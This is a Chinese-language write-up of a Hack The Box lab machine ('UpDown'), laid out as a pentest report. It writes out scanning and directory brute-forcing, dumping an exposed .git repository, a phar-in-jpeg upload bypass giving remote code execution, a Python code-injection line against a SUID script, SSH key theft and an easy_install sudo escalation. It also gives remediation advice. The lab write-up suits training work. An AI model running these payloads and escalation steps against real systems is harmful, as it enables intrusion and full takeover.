## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:UpDown
2. 難度:Medium
3. IP:10.129.227.227

### 主要發現：
1. 漏洞 ：利用phar協議透過本地文件包含(LFI)達成遠端程式碼執行(RCE)（風險等級：Critical）
2. 漏洞 ：繞過暴露的不嚴格黑名單達成文件上傳漏洞（風險等級：Medium）

### 攻擊鏈摘要：

經過目錄爆破獲得洩漏的git內容後，可下載dev目錄的原始碼，其中可得知檔案上傳的規則與黑名單，繞過後可使用Phar來解析本地文件來達成遠端程式碼執行。取得初始權限後，透過Python程式碼注入擁有SUID權限的Python腳本，成功獲得使用者的ssh_rsa文件，達成橫向移動。使用者無需密碼可以root權限執行easy_intall，使攻擊者輕易完成權限提升。

### 潛在影響：

1. 洩漏的git倉庫含有完整程式碼，將會影響dev子目錄網站的正常運行，並且導致攻擊者繞過黑名單，完成遠端程式碼執行，造成重大資訊洩漏。
2. siteisup_test.py腳本並未過濾使用者輸入，導致攻擊者可獲得使用者權限，洩漏敏感資訊。
3. easy_intall的sudo權限未設密碼，導致攻擊者輕易獲得root權限。

### 修復建議：

1. 妥善保管git倉庫，並嚴格限制上傳檔案限制，應實施白名單制。
2. 徹底禁用Phar偽協議，並過濾上傳路徑使用符號。
3. siteisup_test.py腳本應妥善過濾使用者輸入，避免程式碼注入。
4. easy_intall的sudo權限應設置密碼。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
1. 用穩定的TCP協議進行全掃描，這步需要完整性，不能有漏，最低速率要參考網速，可以先ping靶機測試
2. 詳細訊息掃描，探測服務版本、使用默認腳本並且掃描作業系統
3. 用漏洞腳本進行掃描
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.227.227
sudo nmap -sT -Pn -sV -sC -O -p22,80 10.129.227.227
sudo nmap --script=vuln -p22,80 10.129.227.227
```
<img width="860" height="199" alt="螢幕擷取畫面 2026-02-19 183421" src="https://github.com/user-attachments/assets/1d51e4e2-71f5-432f-bd69-997c9faf4da9" />
<img width="935" height="427" alt="螢幕擷取畫面 2026-02-19 183515" src="https://github.com/user-attachments/assets/c668de4e-b9f2-49c2-9b95-0c0152900b21" />
<img width="760" height="458" alt="螢幕擷取畫面 2026-02-19 183657" src="https://github.com/user-attachments/assets/37b29448-c456-46ee-b305-0bff11a29205" />

根據漏洞腳本掃描的結果，探索80主頁及/dev子目錄

<img width="902" height="601" alt="螢幕擷取畫面 2026-02-19 183459" src="https://github.com/user-attachments/assets/6d86baa1-e43d-47e0-b7bb-ac3cafe47f33" />
<img width="1080" height="617" alt="螢幕擷取畫面 2026-02-19 183851" src="https://github.com/user-attachments/assets/bd3b47f5-2999-4630-9e90-8dbdf7efe4af" />

妥善設置/etc/hosts文件

<img width="556" height="149" alt="螢幕擷取畫面 2026-02-19 183941" src="https://github.com/user-attachments/assets/6584d286-03c2-4876-b3f2-4794c60b6e62" />

設置後的/dev出現404

<img width="845" height="354" alt="螢幕擷取畫面 2026-02-19 184015" src="https://github.com/user-attachments/assets/0644039a-c9ad-4a1a-a1d5-c6289dd0cedc" />


### 2.2 枚舉(Enumeration)

使用gobuster爆破目錄
```bash
sudo gobuster dir -u http://siteisup.htb -w /usr/share/dirbuster/wordlists/directory-2.3-medium.txt
```

<img width="940" height="281" alt="螢幕擷取畫面 2026-02-19 184217" src="https://github.com/user-attachments/assets/911af3ff-849f-4917-a36e-8050bc3313f4" />

因探索主頁和/dev並未發現攻擊面，目錄爆破也只有/dev，所以我對/dev再次進行目錄爆破。針對/dev的目錄爆破我進行了三次，第一次用原參數，第二次增加附檔名-x php,txt均無果，第三次更換字典後才有了結果。
```bash
sudo gobuster dir -u http://searcher.htb/dev/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
```
<img width="1036" height="457" alt="螢幕擷取畫面 2026-02-19 184238" src="https://github.com/user-attachments/assets/43bec1a4-26b6-4c96-96f7-8ac573ae2ed2" />

探索/dev/.git/HEAD和/dev/.git

<img width="737" height="206" alt="螢幕擷取畫面 2026-02-19 184442" src="https://github.com/user-attachments/assets/85971348-2b4a-4f79-af0f-503785aff91c" />
<img width="838" height="569" alt="螢幕擷取畫面 2026-02-19 184459" src="https://github.com/user-attachments/assets/6636e26d-2c45-4fc4-b59c-437091c35ed2" />


### 2.3 初始存取(Initial Access)

使用git-dumper工具下載git倉庫
```bash
git-dumper http://siteisup.htb/dev/.git/ .
```
<img width="661" height="452" alt="螢幕擷取畫面 2026-02-19 184728" src="https://github.com/user-attachments/assets/9a2c8d99-8809-46ff-a5a5-ff6456e465e6" />

探索下載到的文件，.htaccess中有特殊標頭，checker.php則是/dev的程式碼，其中有上傳檔案黑名單、上傳檔案路徑以及文件銷毀機制，非常重要。

<img width="562" height="329" alt="螢幕擷取畫面 2026-02-19 184933" src="https://github.com/user-attachments/assets/68c094a2-5123-4d21-a525-838e833658f3" />
<img width="809" height="721" alt="螢幕擷取畫面 2026-02-19 185000" src="https://github.com/user-attachments/assets/2933e4b7-525c-45fd-877b-30e7aec69d3c" />
<img width="854" height="383" alt="螢幕擷取畫面 2026-02-19 185026" src="https://github.com/user-attachments/assets/bf0dfde1-c9a1-414e-8f60-3a056f111e05" />
<img width="802" height="102" alt="螢幕擷取畫面 2026-02-19 185056" src="https://github.com/user-attachments/assets/8afe8e57-4945-4a3f-8bd2-a79ebf5c6112" />

使用HackBar工具添加特殊標頭，再訪問/dev

<img width="1484" height="752" alt="螢幕擷取畫面 2026-02-19 191955" src="https://github.com/user-attachments/assets/bf21d9b7-24c1-4726-bf4e-684a31ee2fdb" />

製作Payload流程:將PHP檔zip成.phar，再更名為.jpeg，若直接使用phar檔會觸發銷毀機制，可在內容裡添加大量隨機網址避免銷毀過快
```bash
zip shell.phar shell.php
mv shell.phar shell.jpeg
```

<img width="1340" height="350" alt="螢幕擷取畫面 2026-02-19 194431" src="https://github.com/user-attachments/assets/1c230988-f8f7-42a0-8377-35e4877e76bf" />

上傳shell.jpeg，但不可被呼叫

<img width="1300" height="624" alt="螢幕擷取畫面 2026-02-19 194451" src="https://github.com/user-attachments/assets/cd730230-b8f7-40a9-9517-7b19c6d51103" />
<img width="848" height="285" alt="螢幕擷取畫面 2026-02-19 195326" src="https://github.com/user-attachments/assets/78e5a04f-ffea-4cf9-b9a1-8844fde377bf" />
<img width="1252" height="306" alt="螢幕擷取畫面 2026-02-19 195336" src="https://github.com/user-attachments/assets/da057b8f-beb3-4b89-84d8-82ca820ac51c" />
<img width="1402" height="294" alt="螢幕擷取畫面 2026-02-19 195351" src="https://github.com/user-attachments/assets/5cc5e45e-5f67-4b91-97f9-1ebe4b2ac73f" />

將Payload內容更改為phpinfo()並嘗試呼叫，請注意呼叫時的URL

<img width="472" height="201" alt="螢幕擷取畫面 2026-02-19 201035" src="https://github.com/user-attachments/assets/fbfbdeab-9b45-49bb-8f5e-5fb9df0c0b92" />
<img width="1411" height="722" alt="螢幕擷取畫面 2026-02-19 201055" src="https://github.com/user-attachments/assets/209cedc0-1b6f-47dc-87c8-032600173045" />

利用dfunc-bypasser篩選出未被禁用函數，文件需複製phpinfo的網頁原始碼
```bash
python2 dfunc-bypasser/dfunc-bypasser.py --file phpin.txt
```

<img width="1252" height="560" alt="螢幕擷取畫面 2026-02-19 201149" src="https://github.com/user-attachments/assets/d4f46edd-fb15-4cf6-9bce-4a8aec010827" />
<img width="1527" height="687" alt="螢幕擷取畫面 2026-02-19 204025" src="https://github.com/user-attachments/assets/a0cacc9b-2ef2-48c3-967e-a660006cde33" />
<img width="1269" height="425" alt="螢幕擷取畫面 2026-02-19 203936" src="https://github.com/user-attachments/assets/7e601f57-24ef-4f56-a925-32fb5d420bd9" />

構築[Payload](https://www.sitepoint.com/proc-open-communicate-with-the-outside-world/)，以同樣方式上傳並呼叫，取得反彈Shell

<img width="1356" height="334" alt="螢幕擷取畫面 2026-02-19 210700" src="https://github.com/user-attachments/assets/83ae67da-177f-40f3-9f57-9a39a18c8e9e" />
<img width="664" height="199" alt="螢幕擷取畫面 2026-02-19 210711" src="https://github.com/user-attachments/assets/7b8063c5-8d72-477d-a2ae-08328aa94873" />


### 2.4 橫向移動(Lateral Movement)

低權限帳戶無法取得user.txt

<img width="729" height="459" alt="螢幕擷取畫面 2026-02-19 211035" src="https://github.com/user-attachments/assets/d1a11740-292c-4fc0-afd2-ffc06415f1ff" />

嘗試權限提升
```bash
find / -perm -u=s -type f 2>/dev/null
```
<img width="683" height="289" alt="螢幕擷取畫面 2026-02-19 211943" src="https://github.com/user-attachments/assets/03fcb249-9622-4aa0-abb1-779e5aa3b49c" />
<img width="575" height="156" alt="螢幕擷取畫面 2026-02-19 212312" src="https://github.com/user-attachments/assets/be3fc10f-acb3-4b70-a6de-64789ecb6583" />

siteisup程式會呼叫siteisup_test.py腳本，並以SUID權限執行，因有使用者輸入，可嘗試程式碼注入或路徑劫持，本次使用程式碼注入成功
```python
__import__('os').system('bash')
```

<img width="664" height="109" alt="螢幕擷取畫面 2026-02-19 215223" src="https://github.com/user-attachments/assets/cc688286-45a5-4193-84ca-cbc037782734" />

uid成功移動到使用者，但gid仍為低權限，故繼續探索橫向移動方法

<img width="638" height="49" alt="螢幕擷取畫面 2026-02-19 215333" src="https://github.com/user-attachments/assets/3387e5ee-3dbf-4437-987f-0593691483d5" />

在/home/developer/.ssh中取得ssh_id_rsa，利用SSH橫向移動成功
```bash
nano developer.id_rsa
chmod 600 developer.id_rsa
ssh -i developer.id_rsa developer@10.129.227.227
```

<img width="706" height="768" alt="螢幕擷取畫面 2026-02-19 215626" src="https://github.com/user-attachments/assets/bb553551-147e-41bd-9478-71099d8b6132" />
<img width="599" height="697" alt="螢幕擷取畫面 2026-02-19 215812" src="https://github.com/user-attachments/assets/f20da8a8-6d72-4378-8134-c38af5665bef" />
<img width="625" height="646" alt="螢幕擷取畫面 2026-02-19 220047" src="https://github.com/user-attachments/assets/aad4d4e3-d496-4353-93c2-91645338cff6" />
<img width="528" height="68" alt="螢幕擷取畫面 2026-02-19 220107" src="https://github.com/user-attachments/assets/dbcfba0b-4be7-4736-9482-db9794995022" />


### 2.5 權限提升(Privilege Escalation)

easy_install無須密碼可sudo執行
```bash
sudo -l
```
<img width="964" height="97" alt="螢幕擷取畫面 2026-02-19 220148" src="https://github.com/user-attachments/assets/8a16d532-ca75-4422-98d8-5006a30db564" />

在GTFOBins可找到提權方法


```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```
<img width="966" height="167" alt="螢幕擷取畫面 2026-02-20 173756" src="https://github.com/user-attachments/assets/19d75ab0-85b5-4f8a-bfd9-53fa60d1595c" />

easy_install是舊版的Python包安裝工具，使用時，它會執行python setup.py install命令（打開安裝包➡️解析install邏輯➡️執行install命令），而提權邏輯就是在安裝包裡加戲。

先將TF定義一個隨機路徑，然後生成一個內含執行bash語句的安裝檔，再用sudo權限讓easy_install執行這個安裝包，就相當於以sudo權限執行了加戲的腳本。


### 2.6 最終成果(Impact)

<img width="942" height="168" alt="螢幕擷取畫面 2026-02-19 221452" src="https://github.com/user-attachments/assets/5b60db48-1170-47b7-8352-87a2279efa67" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. 初次存取偏複雜，需要多次測試繞過，要保持邏輯不能亂(製作payload→上傳→呼叫)。
2. 若是實在找不到攻擊面，深度目錄爆破、增加副檔名、換字典，有奇效。
3. GTFOBins經過簡修，有些payload找不到了，可至git的歷史欄位中找。

### 浪費時間的部分：

1. checker.php一開始並未完整看完，導致繞過過程浪費時間，應先完整看完。
2. 目錄爆破未更換字典前因找不到攻擊面迷茫了一段時間。

### 新知識點：

1. dfunc-bypasser的使用方式。
2. GTFOBins的歷史payload搜尋方式。
3. 目錄爆破時的不同字典的特色。

### 與實戰對應：

1. 實戰很常遇到例如git、限制php函數等，本靶機製作講究。
2. 目錄爆破時可考慮更換字典。
